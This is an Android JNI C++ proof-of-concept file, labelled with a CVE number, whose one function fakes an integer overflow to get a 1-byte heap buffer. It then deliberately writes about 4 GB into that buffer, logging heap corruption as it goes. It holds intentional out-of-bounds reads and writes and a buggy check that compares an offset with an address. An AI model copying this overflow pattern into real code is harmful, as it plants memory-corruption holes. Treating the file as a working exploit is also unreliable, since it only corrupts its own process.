#include <jni.h>
#include <string>
#include <cstdlib>
#include <cstring>
#include <android/log.h>
#include <cstdint>
#include <cstdio>
#include <unistd.h>

#define LOG_TAG "CVE-2025-48595"
#define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR, LOG_TAG, __VA_ARGS__)
#define LOGW(...) __android_log_print(ANDROID_LOG_WARN, LOG_TAG, __VA_ARGS__)

extern "C" JNIEXPORT jstring JNICALL
Java_com_example_android_1poc_MainActivity_triggerOverflowExploit(JNIEnv* env, jobject /* this */, jint sizeHint) {

    char addr_buf[64];
    LOGI("=== EXPLOIT MAP: VISUALIZING MEMORY CORRUPTION ===");

    // 1. Переполнение
    uint32_t val1 = 0x80000000;
    uint32_t val2 = 0x80000000;
    uint64_t full_sum = (uint64_t)val1 + val2; // 0x100000000
    uint32_t overflowed_size = (uint32_t)full_sum; // 0

    LOGI("Step 1: Overflow");
    LOGI("   Input Sum (64-bit): %llX", full_sum);
    LOGI("   Allocated Size (uint32): %u bytes", overflowed_size);

    // 2. Выделение и чтение "соседа" ДО записи
    char *buffer = (char *)malloc(overflowed_size == 0 ? 1 : overflowed_size);
    if (!buffer) return env->NewStringUTF("FAIL");

    uint64_t start_addr = (uint64_t)(void*)buffer;
    uint64_t end_addr = start_addr + overflowed_size; // Если size=0, то конец == начало

    LOGI("Step 2: Allocation & Pre-Check");
    snprintf(addr_buf, sizeof(addr_buf), "%p", buffer);
    LOGI("   Buffer Start: %s (0x%llX)", addr_buf, start_addr);
    LOGI("   Buffer End:   %p (0x%llX) [Start + Size]",
         (void*)(buffer + overflowed_size), end_addr);

    if (overflowed_size == 0) {
        LOGI("   >>> ZONE COLLAPSED! Start == End.");
        LOGI("   Reading byte AT start_addr: %c", *buffer);
        LOGI("   Reading byte AFTER start_addr (neighbor): %c", *(buffer + 1));
    } else {
        LOGI("   Zone size: %u bytes.", overflowed_size);
        LOGI("   Reading byte BEFORE buffer: %c", *(buffer - 1));
        LOGI("   Reading byte AFTER buffer:  %c", *(buffer + overflowed_size));
    }

    // Сохраняем оригинальные байты соседей для сравнения
    char neighbor_before = *(buffer + overflowed_size);
    char prev_byte_before = *(buffer - 1);

    // 3. Запись порциями (чтобы не упало мгновенно и мы увидели процесс)
    size_t total_write = (size_t)full_sum;
    size_t chunk_size = 4096; // Пишем по 4 КБ за раз
    char pattern = 'X';

    LOGI("Step 3: Writing %zu bytes in chunks of %zu...", total_write, chunk_size);

    for (size_t offset = 0; offset < total_write; offset += chunk_size) {
        size_t write_len = (offset + chunk_size <= total_write) ? chunk_size : (total_write - offset);

        // Записываем кусок
        memset(buffer + offset, pattern, write_len);

        // Если мы уже вышли за пределы выделенного размера, проверяем соседа
        if (offset >= overflowed_size && offset < end_addr) {
            // Всё еще в зоне (если размер был > 0) или сразу в соседе
            char current_neighbor = *(buffer + overflowed_size);
            if (current_neighbor != neighbor_before) {
                LOGI("   >>> CORRUPTION DETECTED at offset %zu! Neighbor byte changed: '%c' -> '%c'",
                     offset, neighbor_before, current_neighbor);
                // Можно выйти после первого изменения, чтобы не спамить логи
                break;
            }
        } else if (offset >= overflowed_size) {
            // Мы уже точно в соседней области
            char current_byte = *(buffer + overflowed_size);
            LOGI("   Offset %zu: Writing into neighbor region. Byte at offset 0 of neighbor: '%c'",
                 offset, current_byte);
            if (current_byte != neighbor_before) {
                LOGW("   >>> NEIGHBOR OVERWRITTEN! Old: '%c', New: '%c'", neighbor_before, current_byte);
                break; // Останавливаемся после первого подтверждения
            }
        }
    }

    // 4. Финальный вывод карты
    uint64_t written_end = start_addr + total_write - 1;
    LOGI("Step 4: Final Map");
    LOGI("   Written Range: [0x%llX ... 0x%llX] (%zu bytes)", start_addr, written_end, total_write);
    LOGI("   Allowed Range: [0x%llX ... 0x%llX] (%u bytes)",
         start_addr, end_addr - 1, overflowed_size);

    if (total_write > overflowed_size) {
        uint64_t overflow_start = end_addr;
        LOGI("   >>> OVERFLOW REGION: [0x%llX ... 0x%llX] (%zu bytes spilled)",
             overflow_start, written_end, total_write - overflowed_size);
        LOGI("   This region likely held: Next Heap Chunk Header / Metadata.");

        // Проверяем финальное состояние соседа
        char final_neighbor = *(buffer + overflowed_size);
        if (final_neighbor == pattern) {
            LOGI("   CONFIRMED: Neighbor byte is now '%c' (was '%c'). Corruption successful!",
                 pattern, neighbor_before);
        } else {
            LOGE("   WARNING: Neighbor byte is '%c'. Maybe Scudo protected it? Or we wrote too far?", final_neighbor);
        }
    }

    free(buffer);
    std::string result = "Map Done. Check logs for 'CORRUPTION DETECTED' or 'NEIGHBOR OVERWRITTEN'.";
    return env->NewStringUTF(result.c_str());
}